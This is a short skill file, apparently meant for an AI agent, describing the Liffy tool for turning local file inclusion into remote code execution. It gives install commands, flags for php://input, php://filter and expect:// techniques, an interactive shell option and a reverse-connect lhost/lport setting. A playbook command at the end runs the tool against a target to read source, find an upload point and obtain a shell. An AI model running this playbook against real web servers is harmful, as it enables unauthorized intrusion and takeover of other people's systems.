---
name: liffy-lfi
description: "Liffy: LFI->RCE chain. Signals: web vulnerability, injection, LFI exploitation, php://input, php://filter."
zh-signals: "Liffy: LFI→RCE 链。信号:web漏洞,注入,LFI 利用,php://input,php://filter。"
---

# Liffy

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/mzfr/liffy
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/mzfr/liffy && cd liffy && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python liffy.py -u 'https://t.com/?page='` | LFI 利用 |
| `--technique=data` | php://input |
| `--technique=filter` | php://filter |
| `--technique=expect` | expect:// |
| `-i` | 交互 shell |
| `--lhost x --lport 443` | 回连 |

## 攻击场景 Playbook

### LFI→RCE 链

```bash
python liffy.py -u 'https://target/index.php?page=' --technique=filter -i
# php://filter 读源码 → 找上传点 → 包含 getshell
```

## 注意事项

封装 LFI 经典利用链(filter/input/expect);新版加了内置 webshell 生成。
